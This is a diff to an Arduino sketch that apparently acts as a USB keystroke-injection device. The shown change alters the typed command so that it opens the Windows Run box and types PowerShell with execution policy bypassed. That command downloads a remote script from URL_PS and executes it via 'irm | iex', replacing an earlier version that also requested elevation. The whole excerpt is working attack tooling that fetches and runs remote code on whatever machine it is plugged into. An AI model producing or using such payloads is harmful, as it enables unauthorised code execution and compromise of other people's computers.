@@ -79,7 +79,7 @@ void setup() {
     delay(120);
     Keyboard.releaseAll();
     delay(1800);  // the Run box must be open before the text goes in
-    String cmd = String("powershell -NoProfile -ExecutionPolicy Bypass -c \"Start-Process powershell -Verb RunAs -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command iex (irm ") + URL_PS + ")'\"";
+    String cmd = String("powershell -NoExit -ExecutionPolicy Bypass -c \"irm ") + URL_PS + " | iex\"";
     led(1, 0, 0);
     typeText(cmd);
     Keyboard.write(KEY_RETURN);
